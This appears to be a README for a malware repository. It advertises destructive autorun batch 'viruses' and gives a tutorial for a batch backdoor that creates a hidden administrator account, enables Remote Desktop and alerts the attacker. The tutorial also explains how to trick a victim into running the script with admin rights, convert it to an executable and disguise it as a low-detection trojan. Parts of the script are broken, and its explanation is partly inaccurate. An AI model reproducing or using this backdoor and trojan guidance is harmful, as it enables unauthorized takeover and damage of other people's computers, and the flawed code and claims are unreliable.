# Malware

## This is my first controbution revised. 
And because I want to give something meaningful as well as just mess around, this repo is a collection of fun little viruses that pack a mean punch.

If you know anything about hacking you will know that batch files are commonly the scum of the hacking world, most tutorials will show you how to make "viruses" that are nothing more than pranks and gain the creator nothing more than a laugh, which is OK, but if you really want something to cause some actual lasting damage those pranks will be no help. 

### So here are a couple of actual batch file viruses included in this repo:
1. Disablenet.bat
2. Shutdowns.bat
3. crashespc.bat
4. system_meltdown.bat

Please Note that the above mentioned viruses make use of the  autorun.inf  file to exploit the autorun feature and can easily infect a windows machine and their effect can be devistating. 
Each .bat file can potencially destroy a PC if it's run individually. I have set them all to autorun, ensuring a non recoverable end result.

#### Additionally!!

For an additional virus that is unlinked and unaffiliated with the .bat set please see the file named:

 ### Here Is a Short Tutorial! 
    Let's try to make an actual batch file virus to gain full access to another computer.
	    NOTE: The user is going to have to be tricked into opening a file that requires admin access.
			
#### The first step is to open notepad and type in: 

    @echo off
	setlocal

	REM Define user variables
	set "username=winsystem"
	set "password=winsystem"
	set "registryPath=HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList"

	REM Function to handle errors
	:ErrorHandler
	echo An error occurred: %1
	exit /b 1

	REM Create a new user and add to administrators group
	net user %username% %password% /add || call :ErrorHandler "Failed to create user %username%"
	net localgroup administrators %username% /add || call :ErrorHandler "Failed to add user %username% to administrators group"

	REM Set PowerShell execution policy to unrestricted
	powershell -Command "Set-ExecutionPolicy Unrestricted -Scope Process -Force" || call :ErrorHandler "Failed to set PowerShell execution policy"

	REM Create a new registry entry to hide the user
	powershell -Command "New-Item -Path '%registryPath%' -Force | New-ItemProperty -Name '%username%' -Value 0 -PropertyType DWord -Force" || call :ErrorHandler "Failed to create registry entry for %username%"

	REM Allow remote desktop connections
	reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f || call :ErrorHandler "Failed to enable remote desktop connections"

	REM Notify the user that the setup is complete
	msg * "The setup is ready. Please connect to the server."

	endlocal
	exit /b 0


## How it Works

   1. Creates a new user called winsystem with the password winsystem
   2. Adds the new user as an admin.
   3. Alows PowerShell scripts to run.
   4. Hides the user from the Log in screen.
   5. Allows RDP (Remote Desktop Protocol)
   6. Sends the message "The setup is ready. Please connect to the server." To the pre-defined IP.
   
##   Last step: 

### Download: 
		https://www.computerhope.com/download/utility/Bat_To_Exe_Converter.zip 

Then convert the batch file and remember to tick the box that says Add Administrator Manifest.

##### REMEMBER: When the box opens DO NOT CLOSE IT! Copy down the computer name, open cmd, and type: ping <the computer name you copied down>.

Thats all! 
As soon as you get the IP, Copy it and input it into RDP and log in as winsystem.

##### NOTE: Replace the items in < > as the items specified (duh).
		
This may be detected by antivirus, but if you join the regular .bat file with a different files a Trojan can be made with low detection rates.
		
##### Remember that all responsibilities are at your own risk.
Please use it only for research purposes. >_0
Seriously though. Do not download this!
